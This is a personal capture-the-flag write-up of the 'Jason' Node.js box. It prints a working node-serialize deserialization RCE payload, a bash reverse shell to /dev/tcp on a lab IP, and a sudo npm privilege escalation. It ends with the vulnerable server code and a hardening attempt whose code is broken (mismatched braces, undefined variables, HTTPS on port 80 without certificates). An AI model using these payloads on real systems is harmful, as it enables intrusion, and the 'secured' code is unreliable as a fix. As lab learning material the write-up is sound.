# Jason Helped-Through

Name: Jason
Date:  08/01/2023
Description: In JavaScript everything is a terrible mistake.
Difficulty:  Easy
Goals:  
- Reequate Json deserialization
- Hack while tired and ill 
- Warm up
- JS website beyond root
Learnt:
- Testing for XXS if the information on the webpage is reflected to you.
- Browser `Inspect` does not show HTML encoded characters.
- Use multiple payloads to verify (non-)existence of XXS
- Node has [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- Securing Cookies
- Node JS
- Wrote some Javascript
- Object Oriented Language - Possible Deserialization Attacks? - Really any language
Beyond Root:
- Learn about JS webserver directory setup
- Harden the webserver

This and [[Corridor-Writeup]] are from [Newbie Tuesdays with Alh4zr3d](https://www.youtube.com/watch?v=2e9pGJbZpJg). I wanted to warm up while ill, get THM streak, harden some webservers mostly for the Json - mostly have fun before I before return to [[Support-Writeup]].

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

POrt is a website powered by Node.JS
![](nodejs.png)
![](sourceroot.png)
Considering it is Linux tried injection fuzzing with FFUF 
![](postid.png)

While Al starting up the machine and getting tot the webpage
```bash
ffuf -u 'http://10.129.227.156/?email=FUZZ' -X POST -w /usr/share/seclists/Fuzzing/special-chars.txt -c --mc all > ffuf-spec-char-fuzz-EMAIL.txt
```

- Testing for XXS if the information on the webpage is reflected to you.
- Browser `Inspect` does not show HTML encoded characters.
- Use multiple payloads to verify (non-)existence of XXS
- Node has [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)


![1000](xxspolyglot.png)

Using common.txt
![](thereisadotgit.png)
but...
![](notifiedofprotections.png)


## Exploit

We provide information for the cookie to give us sessions, this should mean we could customise a cookie to session hijack. This was a what surfaced from my brain during active recall. I just concatenate the hijack and cookie, part but the process of transforming the cookie to the change it and transforming it back is encapsulated in th idea.
![](cookiedecode.png)

```bash
# find the error and enumerate some cookie creation methods
echo $cookie_cut_off_an_arbituary_amount | base64 -d 
```

Al then starts considering Deserialization and the primary reason for doing this CTFs as I am doing ARM template in Azure - there be json - and I cant reallyl remember off the top of my head how to do it. I need to build up my Question Based Hacking Methodology.

- Object Oriented Language - Possible Deserialization Attacks? - Really any language

[Serialization](https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/serialization/) *"is the process of converting an object into a stream of bytes to store the object or transmit it to memory, a database, or a file. Its main purpose is to save the state of an object in order to be able to recreate it when needed. The reverse process is called deserialization."*

This important for software to transmit and storing information to a target for deserialization. 

[opsecx](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

[Understanding PHP Object Injection](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)
[Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
[Rails Remote Code Execution Vulnerability Explained](http://blog.codeclimate.com/blog/2013/01/10/rails-remote-code-execution-vulnerability-explained/)
[Arbitrary code execution with Python pickles](https://www.cs.uic.edu/~s/musings/pickle/)

Node JS (De)serialization
```js
serialize()
unserialize()
```

[opsecx](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) - Payload building
```js
var y = {
    rce: function() {
        require('child_process').exec('ls /', function(error, stdout, stderr) {
            console.log(stdout)
        });
    }(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

```js
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ping -c 3 /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```

[nodejsshell](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)

While AL forget a escaping and potentially a semi-colon I'll briefly address ZAP. Not that I am a shill, but ZAP is actually very powerful and in someways better than BurpSuite, for reporting and Bug Bounty hunting (Jasson Haddix recently 2022  methodolgy prefer Zap over Burp) mostly for plugin that are free are Burp Pro gatekept, as burp is multi-panel whereas ZAP is single panel UI centric - visualibity is better for tester. Also ZAP has builtin migitation and explaination text  making reporting AND recommending FIXES easier. Al's terminal color scene screws him on the escaping - the default is very good at that.

I would not suggest install npm, it is notorious
```bash
npm node-serialize
```

He needed neither and I was wrong - we did not need to escape the quotes; I just wrote the file for later use and use cat 0th wrapping of line.
```js
{"email":"_$$ND_FUNC$$_function (){require('child_process').exec('ping -c 3 $IP', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

![](encodingthepayload.png)
Callback received
![](deserializedrceping.png)

Change the file to PoC for organisation and added a simple bash shell considering that is linux. It did not work the first while Al was stating that we need to escape the quotes so changed that.
```bash
bash -c \"exec bash -i &>/dev/tcp/10.11.3.193/6969 <&1\"
```

## Foothold

And we are dylan
![](wearedylan.png)

## PrivEsc

Dylan has unconstrained use of sudo on npm
![](sudonpm.png)

[GTFObins has a sudo section](https://gtfobins.github.io/gtfobins/npm/#sudo)

and we are root, before Al has even enumed the box.
![](root.png)

## Beyond Root

Node apps have the general structure of node_module package uinder this directory with the package.json to initialize.
```js
//server.js
var http = require('http')
var fs = require('fs');
var serialize = require('node-serialize');
var url = require('url');
var xssFilters = require('xss-filters');

http.createServer(onRequest).listen(80);
console.log('Server has started');

let $ = require('cheerio').load(fs.readFileSync('index.html'));


function onRequest(request, response){
        if(request.url == "/" && request.method == 'GET'){
                if(request.headers.cookie){
                        var cookie = request.headers.cookie.split('=');
                        if(cookie[0] == "session"){
                                var str = new Buffer(cookie[1], 'base64').toString();
                                var obj = {"email": "guest"};
                                try {
                                        obj = serialize.unserialize(str);
                                }
                                catch (exception) {
                                        console.log(exception);
                                }
                                var email = xssFilters.inHTMLData(obj.email).substring(0,20);
                                $('h3').replaceWith(`<h3>We'll keep you updated at: ${email}</h3>`);
                        }
                }else{
                        $('h3').replaceWith(`<h3>Coming soon! Please sign up to our newsletter to receive updates.</h3>`);
                }
        }else if(request.url.includes("?email=") && request.method == 'POST'){
                console.log("POSTED email!");
                var qryObj = url.parse(request.url,true).query;
                var email = qryObj.email;
                var data = `{"email":"${email}"}`;
                var data64 = new Buffer(data).toString('base64');
                response.setHeader('Set-Cookie','session='+data64+'; Max-Age=900000; HttpOnly, Secure');
        }
        response.writeHeader(200, {"Content-Type": "text/html"});
        response.write($.html());
        response.end();
}
```

Really the server should hand out session cookies and not base them on use email so the lines:
```js
var data = `{"email":"${email}"}`;
var data64 = new Buffer(data).toString('base64');
response.setHeader('Set-Cookie','session='+data64+'; Max-Age=900000; HttpOnly, Secure');
```
Should be altered - [A started point](https://cheatcode.co/tutorials/how-to-implement-secure-httponly-cookies-in-node-js-with-express) 

```bash
git clone https://github.com/cheatcode/nodejs-server-boilerplate.git
cd nodejs-server-boilerplate && npm install
npm run server.js
npm i cookie-parser # To automate cookie parsing 
```

ChatGPT suggests that we should add some security to Header  
![](chatgpt.png)

Also we are run HTTP port 80 so using HTTPS would make `'Secure'` this *function*...
```js
response.setHeader('Set-Cookie', [
    'session=' + data64,
    'Max-Age=900000',
    'HttpOnly',
    'Secure',
    'path=/',
    'sameSite=strict'
]);
```

Avoid XST - [cheatcode article](https://cheatcode.co/tutorials/how-to-implement-secure-httponly-cookies-in-node-js-with-express)
```js
const allowedMethods = [
    "OPTIONS",
    "HEAD",
    "CONNECT",
    "GET",
    "POST",
    "PUT",
    "DELETE",
    "PATCH",
  ];

if (!allowedMethods.includes(req.method)) {
    res.status(405).send(`${req.method} not allowed.`);
  }

  next();
};
//
```

Use [HTTPS](https://nodejs.org/api/https.html)
```js
//tryingtosecureServer.js
var https = require('https')
var fs = require('fs');
var serialize = require('node-serialize');
var url = require('url');
var xssFilters = require('xss-filters');

https.createServer(onRequest).listen(80);
console.log('Server has started');

let $ = require('cheerio').load(fs.readFileSync('index.html'));

const allowedMethods = [
    "OPTIONS",
    "HEAD",
    "CONNECT",
    "GET",
    "POST",
    "PUT",
    "DELETE",
    "PATCH",
  ];

function createCookie(email){
// Use the email as the salt
// Data storage number for lookup
// SHA256 some randomised value - storing the key at the storage
}

// string array
function deserializeCookie(cookie) {

}

function onRequest(request, response){
if (!allowedMethods.includes(req.method)) {
    res.status(405).send(`${req.method} not allowed.`);
  }
  next();
} else if(request.url == "/" && request.method == 'GET'){
                if(request.headers.cookie){
                        var cookie = request.headers.cookie.split('=');
                        if(cookie[0] == "session"){
                                deserializeCookie(cookie[1])
                                }
                                catch (exception) {
                                        console.log(exception);
                                }
                                var email = xssFilters.inHTMLData(obj.email).substring(0,20);
                                $('h3').replaceWith(`<h3>We'll keep you updated at: ${email}</h3>`);
                        }
                          
                }else{
                        $('h3').replaceWith(`<h3>Coming soon! Please sign up to our newsletter to receive updates.</h3>`);
                }
        }else if(request.url.includes("?email=") && request.method == 'POST'){
                console.log("POSTED email!");
                var qryObj = url.parse(request.url,true).query;
                var email = qryObj.email;
                var data = createCookie(email);
                var data64 = new Buffer(data).toString('base64');
                response.setHeader('Set-Cookie', [
    'session=' + data64,
    'Max-Age=900000',
    'HttpOnly',
    'Secure',
    'path=/',
    'sameSite=strict'
]);
        }
        response.writeHeader(200, {"Content-Type": "text/html"});
        response.write($.html());
        response.end();
}
```